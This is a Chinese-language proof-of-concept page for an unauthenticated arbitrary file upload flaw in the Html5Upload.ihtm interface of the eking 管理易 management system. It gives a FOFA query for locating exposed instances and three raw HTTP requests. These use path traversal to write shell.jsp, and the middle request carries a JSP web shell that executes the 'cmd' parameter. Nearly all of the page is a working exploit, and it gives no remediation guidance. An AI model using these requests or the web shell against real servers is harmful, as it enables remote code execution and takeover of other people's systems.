# eking管理易Html5Upload接口存在任意文件上传漏洞

eking管理易Html5Upload接口存在任意文件上传漏洞，未经身份验证的远程攻击者可利用此漏洞上传任意文件，在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```yaml
app="EKing-管理易"
```

## poc

创建临时文件

```yaml
POST /Html5Upload.ihtm HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close

comm_type=INIT&sign_id=shell&vp_type=default&file_name=../../shell.jsp&file_size=2048
```

写入文件内容

```jinja2
POST /Html5Upload.ihtm HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
Connection: close

------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="comm_type"

DATA
------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="sign_id"

shell
------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="data_inde"

0
------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="data"; filename="chunk1"
Content-Type: application/octet-stream

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryj7OlOPiiukkdktZR--
```

保存文件

```javascript
POST /Html5Upload.ihtm HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close

comm_type=END&sign_id=shell&file_name=../../shell.jsp
```

![image-20241012132747292](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121327356.png)

![image-20241012132754554](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121327613.png)